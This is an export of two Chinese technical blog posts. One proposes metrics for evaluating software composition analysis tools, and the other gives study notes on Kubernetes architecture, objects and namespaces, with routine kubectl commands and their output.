[{"id":"0f4f52fd9bba6992ed16037b649e9241","title":"软件成分分析工具评估开放指南","content":"1.介绍   借助软件成分分析（SCA）工具，软件开发团队能从许可证合规和安全漏洞角度跟踪和分析引入到项目里的任何开源代码。这样的工具发现开源代码（不同程度的细节和功能），他们直接和间接依赖、许可证有效性，和任何已知的安全漏洞及潜在的攻击。好多公司提供软件成分分析（SCA）工具套装、开源工具、作为社区项目驱动的相关服务。总有关于什么工具最适合特定的模型和环境的问题，缺少对比和评估工具的标准方法，很难回答这个问题。因此，本文的目标是推荐一系列对比指标，用以评价多个软件成分分析（SCA）工具。\n   本文是《企业中开源软件合规性》（第二版）一书中第12章的重大更新版。这本书记录和发布了对比及评估软件成分分析（SCA）工具的指标，搜集反馈、推动建立对比和评测的标准化模型。请注意，没有“一劳永逸”的方案，在市场上有许多工具，具有不同功能、成熟度水平、部署模型等。当你开始这段旅程时，我们强烈推荐你根据特定环境和要求，确定最想要的功能，然后根据这些指标对工具进行测试和评分。\n2.评估指标2.1. 知识库\n知识库的大小通常以开源项目的数量和跟踪文件的数量来衡量。知识库存储开源软件的信息，数据库越大，当你扫描时，就能识别更多的开源代码。\n\n列出跟踪的主要库（如所有NPM，SourceForge等）\n\n跟踪哪些生态系统（如R，Delphi等）\n\n范围中包括什么语言（基于扩展和库类型）。理想情况是，扫描器应该和语言无关；然而，基本没有厂商提供这种支持，因此需要澄清支持什么语言\n\n区分包之间的检测级别（如Maven和“Java”支持，例如，你能发现jar依赖，但实际上不扫描.java源文件的版权&#x2F;许可证信息）\n\n知识库更新频率。频率高的更新更受欢迎，和开源软件的发展保持一致。合规服务和工具提供商有定期更新他们的数据库。有的公司每年更新三到四次，其他公司则频率更高（直到每天），理想情况下，你希望有最大和最新的数据库，增加识别新发布的开源代码的机会。\n\n一个客户的需求多久能被添加到知识库中，对客户需求响应有服务水平协议（SLA）吗？流程是什么？\n\n\n2.2. 检测能力\n整体组件\n\n纠正&#x2F;配置分析器的能力-软件项目很复杂，有不同的构建步骤，需要一个方法去配置工具，捕获现实\n\n检测使用的方法是什么？不同的分析方法各有优缺点，工具生成者应该总结每个使用的扫描器，如何帮助检测。\n\n部分片段-从几行到部分文件\n\n提供什么选项来纠正和验证结果？支持结果排序功能吗（例如P1或严重级）？\n\n自动识别具有正确来源和许可证的代码，不需要合规工程师操作工具来判断什么是正确的匹配，什么是误报。许多源代码扫描引擎，特别是支持片段扫描，能够生成相当数量的误报，需要调查和手动解决。误报率导致的大量人力消耗，是今天市场上很多最出名产品一直存在的问题。当评估这样的产品时，我们推荐优先考虑能自动识别源代码片段，具有需要手动检查的最小误报率。\n\n支持哪种类型的分析（包检测，精确文件类型检测，用来发现单个源文件、二进制文件、多媒体文件）\n\n源代码扫描（代码-&gt;属于哪个开源软件包）？\n\n二进制扫描（二进制-&gt;属于哪个开源软件包）？\n\n片段扫描（代码片段-&gt;拷贝于哪个开源软件包）？\n\n依赖扫描（代码-&gt; 通过包管理器，包含哪个依赖）？\n\n许可证扫描（代码-&gt;开源软件许可证）\n\n支持什么语言?如果支持某种语言，也支持片段分析吗？仅限于包水平吗？精确文件匹配？\n\n安全扫描器（代码-&gt;漏洞？）\n\n其他漏洞检测技术，包括搜索术语，电子邮件&#x2F;URL检测，web服务检测等\n\n\n2.3易用性易用性很重要，因为如果你所有的工程师要访问和使用扫描工具（而不是仅限合规工程师），你可以在合规问题出现之前和工程师使用构建工具集成新代码之前，避免合规问题，你将想要一个容易使用的工具，最小化学习曲线，避免高成本专业培训。\n\n直观的设计和用户界面\n\n本地客户端或浏览器插件可用\n\n移动用户可用\n\n要求最小或不需要培训，培训用来“了解如何检查和评估结果”。请注意，易用性是一个非常主观的标准，很难量化或定性。然而，一些工具确实比其他工具更易于使用。\n\n\n \n2.4. 操作功能\n源代码扫描速度：源代码扫描的速度是今天市场上许多产品的痛点。例如，一个公司设计和开发了自己的数据库，非常适合操作这种类型的数据。因此，他们有一个闪电般扫描速度，比其他现有工具都快。此外，当你把持续集成流程和扫描器集成时，扫描速度特别有用。需要注意的地方，一个是文件被跳过时速度问题，另一个问题是，是否真正执行了版权和许可证检测，或仅仅扫描库&#x2F;包管理文件，如pom.xml文件。\n\n使用工具进行和收购活动相关的扫描，在使用模式上不要有许可证锁定。一些厂商通过许可证协议，只允许扫描和当前项目有关的代码，对这之外的使用场景加以限制。你需要清楚这个事实，确信你能充分使用该工具，例如，对你公司正在考虑的任何并购交易。\n\n编程语言无关：一些工具创建者承认，他们的产品非常擅长某种编程语言，但对其他的则不行。这很有趣，因为你希望任何扫描和识别引擎都应该和编程语言无关，大多数工具并非如此，几乎没有和语言无关的。\n\n整个组织中，重复使用扫描澄清（scan clarification）的功能。\n\n和构建系统（CD&#x2F;CI）无关。。\n\n\n2.5 集成功能\n提供容易集成的API，和命令行接口（CLI）：使用扫描工具的方式不仅限于用户界面。理想情况，公司希望工具和他们当前的开发、构建及流程集成到一起。如果扫描工具支持API，CLI将允许系统管理员和用户界面之外的工具交互，这样的场景是可行的。。\n\n支持用户界面（UI）集成功能。\n\n将组织的合规策略集成到工具内，当和声明的策略及规则有关时，具有规则标记码（flag code）。\n\n\n2.6.  安全漏洞数据库\n漏洞数据库的规模-所有项目中跟踪的漏洞数量：数据库包含已知漏洞信息，能支持工具检测源代码中安全相关的问题。请注意“源代码”一词，没有特别指定是开源组件或第三方组件。如果复制的代码包含已知安全漏洞，当你扫描私有组件时，你的引擎应该能标记这个漏洞。\n\n漏洞数据库更新频率：服务提供商定期更新他们的数据库，更新周期越短，也就能更好地发现漏洞。\n\n漏洞信息源的数量：多个信息源能够充实开源组件中安全漏洞数据库。当评估提供这个服务的合规工具时，我们推荐调查这个方面和探索实际上的更新机制。使用各种信息源（直接和间接）来收集安全漏洞的信息，在这个基础上，提出修复这些漏洞的建议。\n\n工具提供商为验证漏洞报警，而从事的任何其他研究。\n\n精确度（漏洞被正确识别的比率）。有四个级别的准确率。\n\n\n  - 1 存在漏洞的软件已经被正确地对应到我们私有软件中实际使用的依赖项  - 2 依赖项用在重要的环境（运行时）。  - 3 在重要环境中的私有软件调用了依赖项的漏洞部分。  - 4 漏洞可被攻破。\n\n召回率（recall）（发现了多少潜在的真实漏洞，并正确匹配到私有软件？）。实际上，这不可能知道。对比不同的解决方案，对特定的技术栈，估计什么方案具有最高的召回率。\n\n上下文相关的漏洞排序功能。常见漏洞严重性排名，如CVSS3，由于私有软件的环境，可能不准确。用户应该能够关联漏洞的严重性来排序，以便更准确解决安全威胁。\n\n\n2.7高级漏洞发现方法   支持高级漏洞发现，当有漏洞的代码复制到一个新组件时（要求支持源代码片段识别），识别漏洞。\n2.8.相关成本需要考虑几个成本参数：\n\n基础设施成本：IT 基础设施成本和自己安装或通过云使用有关。涉及到客户需要购买、安装和维护的服务器，包括升级基础设施费用，取决于规模、专门的系统管理员成本的多少。\n\n运维成本：成本和管理工具提供的结果有关，涉及到检查和解释结果，采取合适的行动，自动识别误报的工具将降低人工确认上千个误报的人力成本。\n\n每年许可证成本：使用工具的每年软件许可费用（每用户成本、或不限使用）。访问SDK成本，这样你能把扫描引擎和内部工具集成起来，以及任何您想要引入的功能、满足需求，定制化的成本。\n\n和现有引擎&#x2F;IT工具和基础设施集成初始成本：集成费用很难估计，但他们主要是不断发展能力，把工具集成到工作流和流程中，最小中断。\n\n导出项目和其他信息的能，可能是转移到一个新系统，或者是离开旧厂商保留知识。\n\n绑定成本（如果你需要退出并采用其他方案时，需要考虑的成本因素）：当围绕着特定工具，打造整个合规环境，公司常常忽视或没有足够的重视绑定因素和成本。当选择一个新工具之初，我们建议在这个方面考虑周全。\n\n符合特定需要的工程定制成本\n\n\n2.9 部署模型的支持支持各种部署模型：\n\n本地\n\n云\n\n混合部署\n\n\n你的代码和项目留给网络什么信息？对最终用户要非常透明：\n\n源代码和二进制文件内容\n\n部分文件内容&#x2F;字符串\n\n哈希值\n\n编录清单\n\n策略信息\n\n合规&#x2F;不合规状态\n\n\n2.10 报告功能\n生成要求的合规通知：通知是基于实际扫描结果或者是仅仅从知识库拉取的许可证信息？\n\n子组件和子文件是什么？通知中包括实际版权&#x2F;许可证吗？\n\n开源代码片段的通知是什么？\n\n支持各种报告功能-输出各种格式的报告，如Excel&#x2F;电子表格（Spreadsheet）（包括提供详细报告样本）\n\n支持开放标准格式（软件包数据交换（software，package data exchange，SPDX），SARIF，CVE，CVSS等）\n\n\n概念解释参考标准\n\n\nSeries &amp; Number\nTitle\nStatus\nReleased\n\n\n\nSP 800-218\nSecure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\nFinal\n02&#x2F;03&#x2F;2022\n\n\nSP 800-218 (Draft)\nSecure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\nDraft\n09&#x2F;30&#x2F;2021\n\n\nWhite Paper NIST CSWP 13\nMitigating the Risk of Software Vulnerabilities by Adopting a Secure Software Development Framework (SSDF)\nWithdrawn\n04&#x2F;23&#x2F;2020\n\n\n📚参考资料\nNIST.SP.800-218.pdfhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-218.pdf\nNIST.CSWP.04232020.pdfhttps://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf\n\n","slug":"软件成分分析工具评估开放指南","date":"2022-10-26T01:08:35.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件成分分析,产品选型,评估开放指南","author_index":"Moses"},{"id":"ce038301b34a6d4d69c83e210fe584c3","title":"k8s分布式系统视角下重新学习","content":"概述官网地址 Kubernetes是什么?官网地址\n时光回溯[[History of cloud]]\n传统部署时代例如：安装Oracle\n\n针对操作系统准备安装包(下载或者U盘拷贝)\n安装Oracle需要的基础类库\n配置操作系统的相应配置\n执行安装检查，安装命令\n安装失败之后，要完全卸载\n\n虚拟化部署时代\n只是做了物理资源隔离，安装一个Oracle仍旧是个复杂的过程。\n\n容器部署时代\n敏捷应用程序的创建和部署\n关注点在如何构建应用程序的镜像以及启动镜像时的参数配置\n持续开发、集成和部署\n关注开发和运维的分离\n可观察性 跨开发、测试和生产环境的一致性\n可以使用同样的构建产物，在不同的环境上运行，只是启动参数的差异。\n跨云和操作系统发型版本的可移植性\n容器运行环境解决了不同的云和操作系统之间的差异\n\n\n以应用程序为中心的管理\n松耦合、分布式、弹性、解放的微服务\n应用跟硬件，操作系统，网络都没有关系\n弹性：副本数可伸缩\n\n\n资源隔离\n每个应用使用的资管互不影响\n\n\n资源利用\n一个应用的资源利用不是固定的，例如启动一个应用的最低配置和最大需要的配置等。\n\n\n\n为什么需要Kubernetes,它能做什么?\n服务发现和负载均衡\n微服务的两大基石\nRPC\n消息\n\n\n\n\n存储编排\n自动部署和回滚\n自动完成装箱计算\n背包问题\n\n\n自我修复\n传统部署方案需要写定时任务来做应用健康检查和自我修复\n\n\n秘钥与配置管理\n\nKubernetes不是什么\n不限制支持的应用类型。\n不部署源代码,也不构建你的应用程序。\n\nKubernetes组件官网地址\n控制平面组件(Control Plane Components)\nkube-apiserver\n该组件公开了 Kubernetes API\n支持水平扩展\nx轴扩展 增加副本数 ✔️\ny轴扩展 功能、业务拆分成不同的微服务\nz轴扩展 数据分片，租户隔离\n\n\n\n\n\netcd简介etcd 是兼具一致性和高可用性的键值数据库\n特点 [[CAP]]的抉择，etcd是分布式系统，必然无法避开选择P，在CA中选择C,即CP。\n\n一致性 ✔️\n高可用 ✔️\n分区容错 X\n\n对比VSConsul Zookeeper etcd versus other key-value stores | etcd\n两大使用场景\nUsing etcd for metadata\nUsing etcd for distributed coordination\n\nkube-scheduler负责监视新创建的、未指定运行节点的 Pods，选择节点让 Pod 在上面运行。\n调度决策考虑的因素包括\n单个 Pod 和 Pod 集合的资源需求\n硬件&#x2F;软件&#x2F;策略约束\n亲和性和反亲和性规范\n数据位置\n工作负载间的干扰和最后时限\n\nkube-controller-manager\n节点控制器（Node Controller）: 负责在节点出现故障时进行通知和响应\n任务控制器（Job controller）: 监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成\n端点控制器（Endpoints Controller）: 填充端点(Endpoints)对象(即加入 Service 与 Pod)\n服务帐户和令牌控制器（Service Account &amp; Token Controllers）: 为新的命名空间创建默认帐户和 API 访问令牌\n\ncloud-controller-manager\n节点控制器（Node Controller）: 用于在节点终止响应后检查云提供商以确定节点是否已被删除\n路由控制器（Route Controller）: 用于在底层云基础架构中设置路由\n服务控制器（Service Controller）: 用于创建、更新和删除云提供商负载均衡器\n\nNode组件kubelet\n一个在集群中每个节点上运行的代理。\n它保证容器（containers）都 运行在 Pod 中。\nkubelet 接收一组通过各类机制提供给它的 PodSpecs，确保这些 PodSpecs 中描述的容器处于运行状态且健康。\nkubelet 不会管理不是由 Kubernetes 创建的容器。\n\nkube-proxy\n是集群中每个节点上运行的网络代理\n维护节点上的网络规则\n如果操作系统提供了数据包过滤层并可用的话，kube-proxy 会通过它(例如[[iptables]])来实现网络规则。否则， kube-proxy 仅转发流量本身。\n容器运行时(Container Runtime)\n[[CRI&amp;OCI]]\n\n插件(Addon)DNS\n集群 DNS 是一个 DNS 服务器，和环境中的其他 DNS 服务器一起工作，它为 Kubernetes 服务提供 DNS 记录。\nKubernetes 启动的容器自动将此 DNS 服务器包含在其 DNS 搜索列表中。\nWeb界面(仪表盘)\n容器资源监控\n集群层面日志\n\nKubernetesAPI 官网地址\n\nOpenAPI规范\nOpenAPI V2\nOpenAPI V3\n\n使用Kubernetes对象 官网地址理解Kubernetes对象 官网地址\n总结\nKubernetes 对象是持久化的实体\nKubernetes 使用这些实体去表示整个集群的状态\n达成的效果\n哪些容器化应用在运行（以及在哪些节点上）\n可以被应用使用的资源\n关于应用运行时表现的策略，比如重启策略、升级策略，以及容错策略\n\n\nKubernetes 对象是 “目标性记录” —— 一旦创建对象，Kubernetes 系统将持续工作以确保对象存在。 通过创建对象，本质上是在告知 Kubernetes 系统，所需要的集群工作负载看起来是什么样子的， 这就是 Kubernetes 集群的 期望状态（Desired State）。select amount from wallet where user_id &#x3D; 123456;\n100\t\t\t\t\t\t  \nupdate wallet set amount &#x3D; amount+10 where user_id &#x3D; 123456;\t\t\t\t\t\t \nor \t\t\t\t\t\t  \nupdate wallet set amount &#x3D; 100+10 where user_id &#x3D; 123456; \n所有对Kubernetes对象的操作，最终都是通过使用 Kubernetes API\n\n对象规约（Spec）与状态（Status）\nSpec： 对象期望状态（Desired State）\nStatus：对象当前状态（Current State）\n描述 Kubernetes 对象\n多数情况下是使用yaml文件描述。\n必需字段\n\n\napiVersion - 创建该对象所使用的 Kubernetes API 的版本\n例如：apps&#x2F;v1\n\n\nkind - 想要创建的对象的类别\n例如：Pod，Deployment，Service\n\n\nmetadata - 帮助唯一性标识对象的一些数据，包括一个 name 字符串、UID 和可选的 namespac\nspec - 你所期望的该对象的状态，对象 spec 的精确格式对每个 Kubernetes 对象来说是不同的。\n\nKubernetes对象管理 官网地址\n管理技巧\n指令式命令官方文档\n例子kubectl create deployment nginx --image nginx\n权衡\n与对象配置相比的有点：\n命令简单，易学且易于记忆。\n命令仅需一步即可对集群进行更改。\n与对象配置相比的缺点：\n命令不便于与变更审查流程的集成。\n命令不提供与更改关联的审核跟踪。\n除了实时内容外，命令不提供记录原。\n\n\n\n指令式对象配置 官方文档\n例子kubectl create -f nginx.yaml\nkubectl delete -f nginx.yaml -f redis.yaml\nkubectl replace -f nginx.yaml\n权衡与执行令式命令相比优点\n对象配置可以存储在源控制系统中，比如Git。\n对象配置可以与流程集成，例如在推送和审计之前检查更新。\n对象配置提供了用于创建新对象的模板。\n\n与执行令式命令相比缺点：\n对象配置需要对对象架构有基本的了解。(不算缺点)\n对象配置需要额外的步骤来编写yaml文件。\n\n与声明式对象配置相比优点：\n指令式对象配置行为更加简单易懂。\n从 Kubernetes 1.5 版本开始，指令对象配置更加成熟。\n\n与声明式对象配置相比缺点：\n指令式对象配置更适合文件，而非目录。\n对活动对象的更新，必须反应在配置文件中，否则会在下一次替换时丢失。(比如副本数，文件中为3，手动调整为6后，重新发布，又变回了3)\n\n声明式对象配置官方文档\n例子kubectl diff -f configs&#x2F;\nkubectl apply -f configs&#x2F;\nkubectl diff -R -f configs&#x2F;\nkubectl apply -R -f configs&#x2F;\n权衡与指令式对象配置相比优点：\n对活动对象所做的更改即使未合并到配置文件中，也会被保留下来。\n声明性对象配置更好地支持对目录进行操作并自动检测每个文件的操作类型(创建，修补，删除)。\n\n与指令式对象配置相比缺点：\n声明式对象配置难于调试并且出现异常时结果难以解释。\n使用diff产生的部分更新会创建复杂的合并和布丁操作。\n\n分析工作场景，选择合适的方案运维中要解决的问题\n1.审计，谁在什么时间做了什么操作，达到了什么效果\n2.可重复执行，相同的操作重复执行，结果不变\n3.可回滚\n便捷且安全的回滚方案，支持单个应用和多个相关应用的回滚。\n命令如何回滚，配置如何回滚？\n\n\n4.版本控制，版本差异的比对\n5.CI&#x2F;CD\n\n对象名称和IDs官网地址 名称 集群中的每一个对象都有一个名称 来标识在同类资源中的唯一性。\n\nDNS子域名\n不能超过253个字符\n只能包含小写字母、数字，以及’-‘ 和 ‘.’\n须以字母数字开头\n须以字母数字结尾\nRFC 1123\n\n\n最多 63 个字符\n只能包含小写字母、数字，以及 ‘-‘\n须以字母数字开头\n须以字母数字结尾\nRFC 1035          - 路径分段名称\n\n\nUIDs 每个 Kubernetes 对象也有一个UID 来标识在整个集群中的唯一性。\n\n命名空间官网地址\n作用\n将同一集群中的资源划分为相互隔离的组。\n\n限制\n同一命名空间内的资源名称要唯一，但命名空间时没有这个要求。\n作用于Demployment、Service等。\n对StorageClass、Node、PersistentVolume等不适应。\n\n何时使用多个命名空间\n命名空间适用于存在很多跨多个团队或项目的用户的场景。\n命名空间不能相互嵌套，每个 Kubernetes 资源只能在一个名字空间中。\n命名空间是在多个用户之间划分集群资源的一种方法。 不必使用多个名字空间来分隔仅仅轻微不同的资源，例如同一软件的不同版本： 应该使用标签 来区分同一名字空间中的不同资源。\n\n使用命名空间查看命名空间\n## 待执行的命令\nkubectl get namespace\n## 执行结果\n[root@k8s-master-22 ~]# kubectl get namespaces\nNAME              STATUS   AGE\ndefault           Active   13d\nistio-system      Active   13d\nkube-node-lease   Active   13d\nkube-public       Active   13d\nkube-system       Active   13d\n[root@k8s-master-22 ~]#\nKubernetes会创建四个初始的命名空间\ndefault 没有指明使用其它名字空间的对象所使用的默认名字空间\nkube-system Kubernetes 系统创建对象所使用的名字空间\nkube-public 这个命名空间是自动创建的，所有用户都可以读取它。\nkube-node-lease 此命名空间用于与各个节点相关的租约对象。允许kubelet发送心跳到api-server\n\n操作指定命名空间例如\nkubectl run nginx --image&#x3D;nginx --namespace&#x3D;&lt;insert-namespace-name-here&gt;\nkubectl get pods --namespace&#x3D;&lt;insert-namespace-name-here&gt;\n\n## 实际执行结果\nkubectl get pod --namespace&#x3D;kube-system\n[root@k8s-master-22 ~]# kubectl get pod --namespace&#x3D;kube-system\nNAME                                       READY   STATUS    RESTARTS        AGE\ncalico-kube-controllers-6fd7b9848d-4zlm5   1&#x2F;1     Running   3 (4h40m ago)   13d\ncalico-node-5c694                          1&#x2F;1     Running   3 (4h40m ago)   13d\ncalico-node-qgtxj                          1&#x2F;1     Running   3 (4h40m ago)   13d\ncoredns-7f6cbbb7b8-r4px6                   1&#x2F;1     Running   3 (4h39m ago)   13d\ncoredns-7f6cbbb7b8-snbdj                   1&#x2F;1     Running   3 (4h39m ago)   13d\netcd-k8s-master-22                         1&#x2F;1     Running   4 (25m ago)     13d\nkube-apiserver-k8s-master-22               1&#x2F;1     Running   6 (24m ago)     13d\nkube-controller-manager-k8s-master-22      1&#x2F;1     Running   4 (25m ago)     13d\nkube-proxy-c964g                           1&#x2F;1     Running   3 (4h40m ago)   13d\nkube-proxy-sdqxg                           1&#x2F;1     Running   3 (4h40m ago)   13d\nkube-scheduler-k8s-master-22               1&#x2F;1     Running   4 (25m ago)     13d\n\n设置默认的命名空间当前默认命名空间为defaultkubectl get pod\n## 实际执行结果\n[root@k8s-master-22 ~]# kubectl get pod\nNAME                              READY   STATUS    RESTARTS        AGE\ncat-dp-58cf7df488-gf8h4           2&#x2F;2     Running   6 (4h42m ago)   13d\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   6 (4h42m ago)   13d\ndog-dp-b6c8757d4-dts8v            2&#x2F;2     Running   6 (4h42m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   6 (4h42m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   6 (4h42m ago)   13d\nkubectl get pod -n default\n## 实际执行结果\n[root@k8s-master-22 ~]# kubectl get pod -n default\nNAME                              READY   STATUS    RESTARTS        AGE\ncat-dp-58cf7df488-gf8h4           2&#x2F;2     Running   6 (4h43m ago)   13d\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   6 (4h43m ago)   13d\ndog-dp-b6c8757d4-dts8v            2&#x2F;2     Running   6 (4h43m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   6 (4h43m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   6 (4h43m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   6 (4h43m ago)   13d\n设置默认的命名空间为kube-systemkubectl config set-context --current --namespace&#x3D;kube-system\n## 实际执行结果\n[root@k8s-master-22 ~]# kubectl config set-context --current --namespace&#x3D;kube-system\nContext &quot;kubernetes-admin@kubernetes&quot; modified.\n\t\t\t\t\t\t  \n## 查看当前命名空间\nkubectl config view --minify | grep namespace:\n## 实际执行结果\n[root@k8s-master-22 ~]# kubectl config view --minify | grep namespace:\nnamespace: kube-system\n## 查看pod\nkubectl get pod\n## 实际执行结果\n[root@k8s-master-22 ~]# kubectl get pod\nNAME                                       READY   STATUS    RESTARTS        AGE\ncalico-kube-controllers-6fd7b9848d-4zlm5   1&#x2F;1     Running   3 (4h47m ago)   13d\ncalico-node-5c694                          1&#x2F;1     Running   3 (4h47m ago)   13d\ncalico-node-qgtxj                          1&#x2F;1     Running   3 (4h47m ago)   13d\ncoredns-7f6cbbb7b8-r4px6                   1&#x2F;1     Running   3 (4h47m ago)   13d\ncoredns-7f6cbbb7b8-snbdj                   1&#x2F;1     Running   3 (4h47m ago)   13d\netcd-k8s-master-22                         1&#x2F;1     Running   4 (32m ago)     13d\nkube-apiserver-k8s-master-22               1&#x2F;1     Running   6 (32m ago)     13d\nkube-controller-manager-k8s-master-22      1&#x2F;1     Running   4 (32m ago)     13d\nkube-proxy-c964g                           1&#x2F;1     Running   3 (4h47m ago)   13d\nkube-proxy-sdqxg                           1&#x2F;1     Running   3 (4h47m ago)   13d\nkube-scheduler-k8s-master-22               1&#x2F;1     Running   4 (32m ago)     13d\n## 还原默认的命名空间为default\nkubectl config set-context --current --namespace&#x3D;default\n## 查看当前默认的命名空间\nkubectl config view --minify | grep namespace:\t\t\t\t\t\t  \n\n命名空间和DNS\n创建一个服务(Service)，就会创建一个对应的DNS条目。\n\n\n条目形式： 该条目的形式是 &lt;服务名称&gt;.&lt;名字空间名称&gt;.svc.cluster.local\n解析：容器如果只使用服务名，它将被解析到本地名字空间的服务。\n\n\n并非所有的对象都在命名空间中\n\n\n大多数资源都位于某个命名空间中。\nDeployment\nPod\nService\n\n\n底层资源一般不在命名空间中\n节点\n持久化卷\n\n\n\n\n查看在命名空间和不在命名空间中的资源# 位于名字空间中的资源\nkubectl api-resources --namespaced&#x3D;true\n\t\t\t\t\t\t  \n# 不在名字空间中的资源\nkubectl api-resources --namespaced&#x3D;false\n实际的执行结果在命名空间中的资源[root@k8s-master-22 ~]# kubectl api-resources --namespaced&#x3D;true\nNAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND\nbindings                                 v1                             true         Binding\nconfigmaps                  cm           v1                             true         ConfigMap\nendpoints                   ep           v1                             true         Endpoints\nevents                      ev           v1                             true         Event\nlimitranges                 limits       v1                             true         LimitRange\npersistentvolumeclaims      pvc          v1                             true         PersistentVolumeClaim\npods                        po           v1                             true         Pod\npodtemplates                             v1                             true         PodTemplate\nreplicationcontrollers      rc           v1                             true         ReplicationController\nresourcequotas              quota        v1                             true         ResourceQuota\nsecrets                                  v1                             true         Secret\nserviceaccounts             sa           v1                             true         ServiceAccount\nservices                    svc          v1                             true         Service\ncontrollerrevisions                      apps&#x2F;v1                        true         ControllerRevision\ndaemonsets                  ds           apps&#x2F;v1                        true         DaemonSet\ndeployments                 deploy       apps&#x2F;v1                        true         Deployment\nreplicasets                 rs           apps&#x2F;v1                        true         ReplicaSet\nstatefulsets                sts          apps&#x2F;v1                        true         StatefulSet\nlocalsubjectaccessreviews                authorization.k8s.io&#x2F;v1        true         LocalSubjectAccessReview\nhorizontalpodautoscalers    hpa          autoscaling&#x2F;v1                true         \nHorizontalPodAutoscaler  cronjobs                    cj           batch&#x2F;v1                       true         \nCronJob  jobs                                     batch&#x2F;v1             true         Job\nleases                                   coordination.k8s.io&#x2F;v1         true         Lease\n networkpolicies                          crd.projectcalico.org&#x2F;v1       true         NetworkPolicy\nnetworksets                              crd.projectcalico.org&#x2F;v1       true         NetworkSet\nendpointslices                           discovery.k8s.io&#x2F;v1            true         EndpointSlice\n events                      ev           events.k8s.io&#x2F;v1               true         Event\nwasmplugins                              extensions.istio.io&#x2F;v1alpha1   true         WasmPlugin\nistiooperators              iop,io       install.istio.io&#x2F;v1alpha1      true         IstioOperator\ndestinationrules            dr           networking.istio.io&#x2F;v1beta1    true         DestinationRule\n envoyfilters                             networking.istio.io&#x2F;v1alpha3   true         EnvoyFilter\ngateways                    gw           networking.istio.io&#x2F;v1beta1    true         Gateway\nserviceentries              se           networking.istio.io&#x2F;v1beta1    true         ServiceEntry\nsidecars                                 networking.istio.io&#x2F;v1beta1    true         Sidecar\nvirtualservices             vs           networking.istio.io&#x2F;v1beta1    true         VirtualService\nworkloadentries             we           networking.istio.io&#x2F;v1beta1    true         WorkloadEntry\nworkloadgroups              wg           networking.istio.io&#x2F;v1alpha3   true         WorkloadGroup\ningresses                   ing          networking.k8s.io&#x2F;v1           true         Ingress\nnetworkpolicies             netpol       networking.k8s.io&#x2F;v1           true         NetworkPolicy\npoddisruptionbudgets        pdb          policy&#x2F;v1                      true         PodDisruptionBudget\nrolebindings                             rbac.authorization.k8s.io&#x2F;v1   true         RoleBinding\nroles                                    rbac.authorization.k8s.io&#x2F;v1   true         Role\nauthorizationpolicies                    security.istio.io&#x2F;v1beta1      true         AuthorizationPolicy\npeerauthentications         pa           security.istio.io&#x2F;v1beta1      true         PeerAuthentication\nrequestauthentications      ra           security.istio.io&#x2F;v1beta1      true         RequestAuthentication\ncsistoragecapacities                     storage.k8s.io&#x2F;v1beta1         true         CSIStorageCapacity\ntelemetries                 telemetry    telemetry.istio.io&#x2F;v1alpha1    true         Telemetry\n不在命名空间中的资源[root@k8s-master-22 ~]# kubectl api-resources --namespaced&#x3D;false\nNAME      SHORTNAMES   APIVERSION        NAMESPACED   KIND\ncomponentstatuses                 cs           v1                                     false        ComponentStatus\nnamespaces                        ns           v1                                     false        Namespace\nnodes                             no           v1                                     false        Node\npersistentvolumes                 pv           v1                                     false        PersistentVolume\nmutatingwebhookconfigurations                  admissionregistration.k8s.io&#x2F;v1        false        MutatingWebhookConfiguration\nvalidatingwebhookconfigurations                admissionregistration.k8s.io&#x2F;v1        false        ValidatingWebhookConfiguration\ncustomresourcedefinitions         crd,crds     apiextensions.k8s.io&#x2F;v1                false        CustomResourceDefinition\napiservices                                    apiregistration.k8s.io&#x2F;v1              false        APIService\n tokenreviews                                   authentication.k8s.io&#x2F;v1               false        TokenReview\nselfsubjectaccessreviews                       authorization.k8s.io&#x2F;v1                false        SelfSubjectAccessReview\nselfsubjectrulesreviews                        authorization.k8s.io&#x2F;v1                false        SelfSubjectRulesReview\nsubjectaccessreviews                           authorization.k8s.io&#x2F;v1                false        SubjectAccessReview\ncertificatesigningrequests        csr          certificates.k8s.io&#x2F;v1                 false        CertificateSigningRequest\nbgpconfigurations                              crd.projectcalico.org&#x2F;v1               false        BGPConfiguration\nbgppeers                                       crd.projectcalico.org&#x2F;v1               false        BGPPeer\nblockaffinities                                crd.projectcalico.org&#x2F;v1               false        BlockAffinity\ncaliconodestatuses                             crd.projectcalico.org&#x2F;v1               false        CalicoNodeStatus\nclusterinformations                            crd.projectcalico.org&#x2F;v1               false        ClusterInformation\nfelixconfigurations                            crd.projectcalico.org&#x2F;v1               false        FelixConfiguration\nglobalnetworkpolicies                          crd.projectcalico.org&#x2F;v1               false        GlobalNetworkPolicy\nglobalnetworksets                              crd.projectcalico.org&#x2F;v1               false        GlobalNetworkSet\nhostendpoints                                  crd.projectcalico.org&#x2F;v1               false        HostEndpoint\nipamblocks                                     crd.projectcalico.org&#x2F;v1               false        IPAMBlock\nipamconfigs                                    crd.projectcalico.org&#x2F;v1               false        IPAMConfig\nipamhandles                                    crd.projectcalico.org&#x2F;v1               false        IPAMHandle\nippools                                        crd.projectcalico.org&#x2F;v1               false        IPPool\nipreservations                                 crd.projectcalico.org&#x2F;v1               false        IPReservation\nkubecontrollersconfigurations                  crd.projectcalico.org&#x2F;v1               false       